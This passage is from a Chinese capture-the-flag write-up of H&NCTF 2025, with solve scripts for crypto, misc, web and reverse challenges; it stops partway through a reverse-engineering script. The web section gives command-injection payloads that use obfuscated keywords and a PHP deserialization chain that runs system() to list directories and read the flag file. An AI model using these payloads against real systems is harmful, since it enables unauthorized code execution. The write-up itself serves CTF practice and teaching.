class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_decode</span>(<span class="params">scrambled: np.ndarray, shuffle_times: <span class="built_in">int</span>, a: <span class="built_in">int</span>, b: <span class="built_in">int</span></span>) -&gt; np.ndarray:</span><br><span class="line">    N = <span class="number">497</span></span><br><span class="line">    img = scrambled.copy()</span><br><span class="line">    tmp = np.zeros_like(img)</span><br><span class="line"></span><br><span class="line">    inv_m = np.array([[ a*b + <span class="number">1</span>, -b],</span><br><span class="line">                      [     -a ,  <span class="number">1</span>]], dtype=<span class="built_in">int</span>) % N</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(shuffle_times):</span><br><span class="line">        tmp.fill(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">                ox, oy = inv_m.dot([x, y]) % N</span><br><span class="line">                tmp[ox, oy] = img[x, y]</span><br><span class="line">        img[:] = tmp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line">encrypted = cv2.imread(<span class="string">&quot;en_flag.png&quot;</span>)</span><br><span class="line">a, b = <span class="number">9</span>, <span class="number">1</span></span><br><span class="line">shuffle_times = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">decrypted = arnold_decode(encrypted, shuffle_times, a, b)</span><br><span class="line">cv2.imwrite(<span class="string">&quot;de_flag.png&quot;</span>, decrypted)</span><br></pre></td></tr></table></figure><p><img src="/2025/06/08/match-2025H&NCTF/de_flag.png" alt="de_flag" style="zoom:67%;"></p><p><code>H&amp;NCTF&#123;haji_coke_you_win&#125;</code></p><p>​    </p><h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><blockquote><p>我不会出题，应该很简单</p></blockquote><p>先DLP求出替换后的new_flag，再爆破变表中未知的7位数，替换后判断结果是否包含flag头。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="number">5084057673176634704877325918195984684237263100965172410645544705367004138917087081637515846739933954602106965103289595670550636402101057955537123475521383</span></span><br><span class="line">c = <span class="number">2989443482952171039348896269189568991072039347099986172010150242445491605115276953489889364577445582220903996856271544149424805812495293211539024953331399</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">512</span></span><br><span class="line">new_flag = <span class="built_in">str</span>(discrete_log(mod(c,n),mod(m,n)))</span><br><span class="line"><span class="built_in">print</span>(new_flag)</span><br><span class="line"></span><br><span class="line">lowercase = <span class="string">&#x27;0123456789&#x27;</span> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> tqdm(permutations(<span class="string">&#x27;0123689&#x27;</span>)):</span><br><span class="line">    now = <span class="string">&#x27;&#x27;</span>.join(k)</span><br><span class="line">    uppercase = <span class="string">f&#x27;7<span class="subst">&#123;now[:<span class="number">3</span>]&#125;</span>4<span class="subst">&#123;now[<span class="number">3</span>:]&#125;</span>5&#x27;</span></span><br><span class="line">    table = <span class="string">&#x27;&#x27;</span>.maketrans(uppercase,lowercase) </span><br><span class="line">    m = new_flag.translate(table)</span><br><span class="line">    flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">    <span class="keyword">if</span> flag.isascii():</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;H&amp;NCTF&#123;cut_cut_rrioajtfijrwegeriogjiireigji&#125;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>H&amp;NCTF&#123;cut_cut_rrioajtfijrwegeriogjiireigji&#125;</code></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Really-Ez-Rce"><a href="#Really-Ez-Rce" class="headerlink" title="Really_Ez_Rce"></a>Really_Ez_Rce</h3><blockquote><p>是..是…是…rce,我们有救了</p></blockquote><p>数组绕过intval + RCE拆分关键词绕过。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://27.25.151.198:33660/?Number[]=1</span><br><span class="line">POST</span><br><span class="line">cmd=a=se64;b=ba;`echo dW5pcSAvZmwq| $b$a -d`</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><blockquote><p>简简单单的looploop~~</p></blockquote><p>构造反序列化链，去掉最后花括号绕Exception。</p><p>先列目录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeiCaFei</span>:</span><br><span class="line">    public_HongCaFei=<span class="string">&#x27;system&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DouBao</span>:</span><br><span class="line">    public_dao=[HeiCaFei(),<span class="string">&#x27;ls /&#x27;</span>]</span><br><span class="line">    public_Dagongren=[<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line">    public_Bagongren=[<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GOGOGO</span>:</span><br><span class="line">    public_dengchao=DouBao()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialize(GOGOGO())[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;s:1:&quot;y&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;s:1:&quot;x&quot;;&#125;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:4:&quot;ls /&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">data=O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;s:1:&quot;y&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;s:1:&quot;x&quot;;&#125;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:4:&quot;ls /&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>得到文件名ofl1111111111ove4g，再读文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeiCaFei</span>:</span><br><span class="line">    public_HongCaFei=<span class="string">&#x27;system&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DouBao</span>:</span><br><span class="line">    public_dao=[HeiCaFei(),<span class="string">&#x27;cat /ofl1111111111ove4g&#x27;</span>]</span><br><span class="line">    public_Dagongren=[<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line">    public_Bagongren=[<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GOGOGO</span>:</span><br><span class="line">    public_dengchao=DouBao()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(serialize(GOGOGO())[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;s:1:&quot;y&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;s:1:&quot;x&quot;;&#125;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:23:&quot;cat /ofl1111111111ove4g&quot;;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">data=O:6:&quot;GOGOGO&quot;:1:&#123;s:8:&quot;dengchao&quot;;O:6:&quot;DouBao&quot;:3:&#123;s:9:&quot;Bagongren&quot;;a:1:&#123;i:0;s:1:&quot;y&quot;;&#125;s:9:&quot;Dagongren&quot;;a:1:&#123;i:0;s:1:&quot;x&quot;;&#125;s:3:&quot;dao&quot;;a:2:&#123;i:0;O:8:&quot;HeiCaFei&quot;:1:&#123;s:9:&quot;HongCaFei&quot;;s:6:&quot;system&quot;;&#125;i:1;s:23:&quot;cat /ofl1111111111ove4g&quot;;&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="F-K"><a href="#F-K" class="headerlink" title="F**K"></a>F**K</h3><blockquote><p>F<strong>K,F</strong>K,F<strong><strong><strong><strong><strong><strong>*</strong></strong></strong></strong></strong></strong>K</p></blockquote><p>代码逻辑：</p><p>先动态打乱base64表，输入经过变表base64编码，每4 字节一块逐块经过MD5后，混淆，得到密文。</p><p>先还原原md5值，分段爆破4字符，连接形成base64，再爆破码表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c = [<span class="number">142</span>, <span class="number">104</span>, <span class="number">27</span>, <span class="number">180</span>, <span class="number">74</span>, <span class="number">250</span>, <span class="number">108</span>, <span class="number">3</span>, <span class="number">200</span>, <span class="number">132</span>, <span class="number">70</span>, <span class="number">123</span>, <span class="number">70</span>, <span class="number">155</span>, <span class="number">231</span>, <span class="number">191</span>, <span class="number">231</span>, <span class="number">241</span>, <span class="number">50</span>, <span class="number">181</span>, <span class="number">223</span>, <span class="number">57</span>, <span class="number">22</span>, <span class="number">254</span>, <span class="number">59</span>, <span class="number">141</span>, <span class="number">144</span>, <span class="number">32</span>, <span class="number">136</span>, <span class="number">214</span>, <span class="number">188</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">80</span>, <span class="number">1</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">233</span>, <span class="number">235</span>, <span class="number">238</span>, <span class="number">234</span>, <span class="number">99</span>, <span class="number">254</span>, <span class="number">24</span>, <span class="number">157</span>, <span class="number">117</span>, <span class="number">1</span>, <span class="number">76</span>, <span class="number">89</span>, <span class="number">177</span>, <span class="number">255</span>, <span class="number">147</span>, <span class="number">99</span>, <span class="number">216</span>, <span class="number">206</span>, <span class="number">96</span>, <span class="number">253</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">74</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">248</span>, <span class="number">150</span>, <span class="number">140</span>, <span class="number">58</span>, <span class="number">191</span>, <span class="number">209</span>, <span class="number">19</span>, <span class="number">24</span>, <span class="number">189</span>, <span class="number">147</span>, <span class="number">193</span>, <span class="number">16</span>, <span class="number">136</span>, <span class="number">234</span>, <span class="number">213</span>, <span class="number">10</span>, <span class="number">127</span>, <span class="number">213</span>, <span class="number">74</span>, <span class="number">18</span>, <span class="number">222</span>, <span class="number">82</span>, <span class="number">240</span>, <span class="number">177</span>, <span class="number">21</span>, <span class="number">137</span>, <span class="number">56</span>, <span class="number">183</span>, <span class="number">108</span>, <span class="number">179</span>, <span class="number">55</span>, <span class="number">79</span>, <span class="number">139</span>, <span class="number">121</span>, <span class="number">93</span>, <span class="number">168</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">237</span>, <span class="number">111</span>, <span class="number">31</span>, <span class="number">245</span>, <span class="number">241</span>, <span class="number">192</span>, <span class="number">27</span>, <span class="number">84</span>, <span class="number">188</span>, <span class="number">247</span>, <span class="number">116</span>, <span class="number">219</span>, <span class="number">69</span>, <span class="number">86</span>, <span class="number">205</span>, <span class="number">196</span>, <span class="number">226</span>, <span class="number">166</span>, <span class="number">147</span>, <span class="number">251</span>, <span class="number">9</span>, <span class="number">126</span>, <span class="number">242</span>, <span class="number">35</span>, <span class="number">92</span>, <span class="number">145</span>, <span class="number">95</span>, <span class="number">147</span>, <span class="number">0</span>, <span class="number">229</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">138</span>, <span class="number">173</span>, <span class="number">193</span>, <span class="number">126</span>, <span class="number">24</span>, <span class="number">198</span>, <span class="number">34</span>, <span class="number">75</span>, <span class="number">215</span>, <span class="number">166</span>, <span class="number">202</span>, <span class="number">47</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">16</span>, <span class="number">94</span>, <span class="number">89</span>, <span class="number">190</span>, <span class="number">174</span>, <span class="number">36</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">42</span>, <span class="number">77</span>, <span class="number">209</span>, <span class="number">245</span>, <span class="number">106</span>, <span class="number">252</span>, <span class="number">93</span>, <span class="number">132</span>, <span class="number">234</span>, <span class="number">235</span>, <span class="number">27</span>, <span class="number">39</span>, <span class="number">131</span>, <span class="number">82</span>, <span class="number">160</span>, <span class="number">187</span>, <span class="number">157</span>, <span class="number">244</span>, <span class="number">10</span>, <span class="number">169</span>, <span class="number">85</span>, <span class="number">48</span>, <span class="number">241</span>, <span class="number">112</span>, <span class="number">22</span>, <span class="number">83</span>, <span class="number">119</span>, <span class="number">27</span>, <span class="number">44</span>, <span class="number">153</span>, <span class="number">23</span>, <span class="number">154</span>, <span class="number">112</span>, <span class="number">226</span>, <span class="number">64</span>, <span class="number">144</span>, <span class="number">195</span>, <span class="number">177</span>, <span class="number">234</span>, <span class="number">146</span>, <span class="number">75</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">90</span>, <span class="number">48</span>, <span class="number">191</span>, <span class="number">86</span>, <span class="number">48</span>, <span class="number">108</span>, <span class="number">240</span>, <span class="number">48</span>, <span class="number">77</span>, <span class="number">91</span>, <span class="number">9</span>, <span class="number">124</span>, <span class="number">116</span>, <span class="number">152</span>, <span class="number">158</span>, <span class="number">136</span>, <span class="number">114</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">92</span>, <span class="number">56</span>, <span class="number">165</span>, <span class="number">118</span>, <span class="number">11</span>, <span class="number">168</span>, <span class="number">238</span>, <span class="number">123</span>, <span class="number">241</span>, <span class="number">179</span>, <span class="number">173</span>, <span class="number">88</span>, <span class="number">45</span>, <span class="number">191</span>, <span class="number">167</span>, <span class="number">51</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">70</span>, <span class="number">127</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">157</span>, <span class="number">134</span>, <span class="number">26</span>, <span class="number">198</span>, <span class="number">214</span>, <span class="number">178</span>, <span class="number">153</span>, <span class="number">204</span>, <span class="number">199</span>, <span class="number">130</span>, <span class="number">171</span>, <span class="number">237</span>, <span class="number">58</span>, <span class="number">107</span>, <span class="number">18</span>, <span class="number">166</span>, <span class="number">248</span>, <span class="number">191</span>, <span class="number">28</span>, <span class="number">59</span>, <span class="number">235</span>, <span class="number">218</span>, <span class="number">224</span>, <span class="number">97</span>, <span class="number">8</span>, <span class="number">21</span>, <span class="number">1</span>, <span class="number">139</span>, <span class="number">36</span>, <span class="number">67</span>, <span class="number">202</span>, <span class="number">21</span>, <span class="number">75</span>, <span class="number">29</span>, <span class="number">145</span>, <span class="number">136</span>, <span class="number">188</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">97</span>, <span class="number">55</span>, <span class="number">10</span>, <span class="number">162</span>, <span class="number">211</span>, <span class="number">48</span>, <span class="number">150</span>, <span class="number">81</span>, <span class="number">170</span>, <span class="number">165</span>, <span class="number">217</span>, <span class="number">80</span>, <span class="number">91</span>, <span class="number">130</span>, <span class="number">58</span>, <span class="number">170</span>, <span class="number">31</span>, <span class="number">119</span>, <span class="number">255</span>, <span class="number">156</span>, <span class="number">166</span>, <span class="number">79</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">231</span>, <span class="number">128</span>, <span class="number">8</span>, <span class="number">139</span>, <span class="number">229</span>, <span class="number">206</span>, <span class="number">29</span>, <span class="number">252</span>, <span class="number">11</span>, <span class="number">104</span>, <span class="number">102</span>, <span class="number">188</span>, <span class="number">95</span>, <span class="number">250</span>, <span class="number">68</span>, <span class="number">194</span>, <span class="number">95</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">134</span>, <span class="number">20</span>, <span class="number">98</span>, <span class="number">210</span>, <span class="number">244</span>, <span class="number">162</span>, <span class="number">232</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">39</span>, <span class="number">72</span>, <span class="number">40</span>, <span class="number">174</span>, <span class="number">91</span>, <span class="number">118</span>, <span class="number">232</span>, <span class="number">188</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">139</span>, <span class="number">132</span>, <span class="number">76</span>, <span class="number">41</span>, <span class="number">200</span>, <span class="number">146</span>, <span class="number">127</span>, <span class="number">220</span>, <span class="number">30</span>, <span class="number">166</span>, <span class="number">128</span>, <span class="number">255</span>, <span class="number">120</span>, <span class="number">63</span>, <span class="number">225</span>, <span class="number">57</span>, <span class="number">75</span>, <span class="number">208</span>, <span class="number">204</span>, <span class="number">224</span>, <span class="number">19</span>, <span class="number">247</span>, <span class="number">54</span>, <span class="number">124</span>, <span class="number">221</span>, <span class="number">92</span>, <span class="number">150</span>, <span class="number">2</span>, <span class="number">220</span>, <span class="number">249</span>, <span class="number">233</span>, <span class="number">221</span>, <span class="number">24</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">172</span>, <span class="number">67</span>, <span class="number">38</span>, <span class="number">179</span>, <span class="number">223</span>, <span class="number">104</span>, <span class="number">194</span>, <span class="number">254</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">176</span>, <span class="number">102</span>, <span class="number">221</span>, <span class="number">4</span>, <span class="number">106</span>, <span class="number">255</span>, <span class="number">210</span>, <span class="number">250</span>, <span class="number">225</span>, <span class="number">134</span>, <span class="number">239</span>, <span class="number">161</span>, <span class="number">4</span>, <span class="number">188</span>, <span class="number">173</span>, <span class="number">209</span>, <span class="number">206</span>, <span class="number">88</span>, <span class="number">168</span>, <span class="number">93</span>, <span class="number">157</span>, <span class="number">55</span>, <span class="number">81</span>, <span class="number">127</span>, <span class="number">207</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">187</span>, <span class="number">75</span>, <span class="number">180</span>, <span class="number">22</span>, <span class="number">27</span>, <span class="number">191</span>, <span class="number">227</span>, <span class="number">113</span>, <span class="number">5</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">88</span>, <span class="number">50</span>, <span class="number">232</span>, <span class="number">89</span>, <span class="number">44</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">212</span>, <span class="number">11</span>, <span class="number">158</span>, <span class="number">2</span>, <span class="number">244</span>, <span class="number">161</span>, <span class="number">52</span>, <span class="number">62</span>, <span class="number">242</span>, <span class="number">143</span>, <span class="number">163</span>, <span class="number">159</span>, <span class="number">127</span>, <span class="number">36</span>, <span class="number">52</span>, <span class="number">110</span>, <span class="number">41</span>, <span class="number">36</span>, <span class="number">107</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">179</span>, <span class="number">226</span>, <span class="number">108</span>, <span class="number">55</span>, <span class="number">228</span>, <span class="number">234</span>, <span class="number">121</span>, <span class="number">68</span>, <span class="number">249</span>, <span class="number">165</span>, <span class="number">40</span>, <span class="number">93</span>, <span class="number">206</span>, <span class="number">174</span>, <span class="number">121</span>, <span class="number">35</span>, <span class="number">134</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">159</span>, <span class="number">135</span>, <span class="number">17</span>, <span class="number">209</span>, <span class="number">15</span>, <span class="number">230</span>, <span class="number">116</span>, <span class="number">189</span>, <span class="number">123</span>, <span class="number">229</span>, <span class="number">129</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">237</span>, <span class="number">210</span>, <span class="number">42</span>, <span class="number">35</span>, <span class="number">231</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">64</span>, <span class="number">214</span>, <span class="number">8</span>, <span class="number">234</span>, <span class="number">120</span>, <span class="number">18</span>, <span class="number">120</span>, <span class="number">184</span>, <span class="number">79</span>, <span class="number">133</span>, <span class="number">233</span>, <span class="number">108</span>, <span class="number">139</span>, <span class="number">109</span>, <span class="number">231</span>, <span class="number">140</span>, <span class="number">20</span>, <span class="number">33</span>, <span class="number">138</span>, <span class="number">146</span>, <span class="number">63</span>, <span class="number">186</span>, <span class="number">45</span>, <span class="number">121</span>, <span class="number">104</span>, <span class="number">190</span>, <span class="number">162</span>, <span class="number">9</span>, <span class="number">146</span>, <span class="number">213</span>, <span class="number">179</span>, <span class="number">254</span>, <span class="number">124</span>, <span class="number">78</span>, <span class="number">82</span>, <span class="number">23</span>, <span class="number">226</span>, <span class="number">170</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">189</span>, <span class="number">2</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">128</span>, <span class="number">170</span>, <span class="number">243</span>, <span class="number">51</span>, <span class="number">187</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">229</span>, <span class="number">29</span>, <span class="number">150</span>, <span class="number">68</span>, <span class="number">143</span>, <span class="number">78</span>, <span class="number">17</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">165</span>, <span class="number">112</span>, <span class="number">152</span>, <span class="number">77</span>, <span class="number">188</span>, <span class="number">213</span>, <span class="number">124</span>, <span class="number">191</span>, <span class="number">44</span>, <span class="number">86</span>, <span class="number">19</span>, <span class="number">31</span>, <span class="number">244</span>, <span class="number">54</span>, <span class="number">180</span>, <span class="number">100</span>, <span class="number">255</span>, <span class="number">82</span>, <span class="number">5</span>, <span class="number">68</span>, <span class="number">2</span>, <span class="number">62</span>, <span class="number">21</span>, <span class="number">160</span>, <span class="number">9</span>, <span class="number">105</span>, <span class="number">18</span>, <span class="number">209</span>, <span class="number">81</span>, <span class="number">255</span>, <span class="number">138</span>, <span class="number">90</span>, <span class="number">91</span>, <span class="number">208</span>, <span class="number">105</span>, <span class="number">75</span>, <span class="number">7</span>, <span class="number">103</span>, <span class="number">138</span>, <span class="number">231</span>, <span class="number">143</span>, <span class="number">22</span>, <span class="number">166</span>, <span class="number">64</span>, <span class="number">21</span>, <span class="number">96</span>, <span class="number">227</span>, <span class="number">220</span>, <span class="number">98</span>, <span class="number">132</span>, <span class="number">17</span>, <span class="number">8</span>, <span class="number">81</span>, <span class="number">65</span>, <span class="number">180</span>, <span class="number">122</span>, <span class="number">186</span>, <span class="number">90</span>, <span class="number">71</span>, <span class="number">52</span>, <span class="number">41</span>, <span class="number">231</span>, <span class="number">118</span>, <span class="number">177</span>, <span class="number">218</span>, <span class="number">227</span>, <span class="number">168</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">121</span>, <span class="number">218</span>, <span class="number">165</span>, <span class="number">226</span>, <span class="number">36</span>, <span class="number">65</span>, <span class="number">19</span>, <span class="number">34</span>, <span class="number">70</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">141</span>, <span class="number">246</span>, <span class="number">132</span>, <span class="number">236</span>, <span class="number">14</span>, <span class="number">168</span>, <span class="number">222</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">170</span>, <span class="number">191</span>, <span class="number">188</span>, <span class="number">58</span>, <span class="number">208</span>, <span class="number">15</span>, <span class="number">142</span>, <span class="number">101</span>, <span class="number">132</span>, <span class="number">82</span>, <span class="number">191</span>, <span class="number">67</span>]</span><br><span class="line">c = [c[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> cc <span class="keyword">in</span> c:</span><br><span class="line">    mm = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">7</span> * (j ^ (i + <span class="number">6</span>)) + <span class="number">4660</span> * (i % <span class="number">15</span>)) % <span class="number">256</span> == cc[i]:</span><br><span class="line">                mm.append(j)</span><br><span class="line">    m.append(<span class="built_in">bytes</span>(mm).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits+<span class="string">&#x27;+/=&#x27;</span></span><br><span class="line">ans_b64 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">0</span>,<span class="built_in">len</span>(m),<span class="number">4</span>):</span><br><span class="line">    res = mbruteforce(<span class="keyword">lambda</span> x: md5(x.encode()).hexdigest()==m[i], table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(m[i],res)</span></span><br><span class="line">    ans_b64 += res</span><br><span class="line"><span class="built_in">print</span>(ans_b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># YIfUW7XMk7rrTcmnOYLPd63vg5S5S7BojdO/lr/1dt6=</span></span><br><span class="line"></span><br><span class="line">ans_b64 = <span class="string">&#x27;YIfUW7XMk7rrTcmnOYLPd63vg5S5S7BojdO/lr/1dt6=&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span 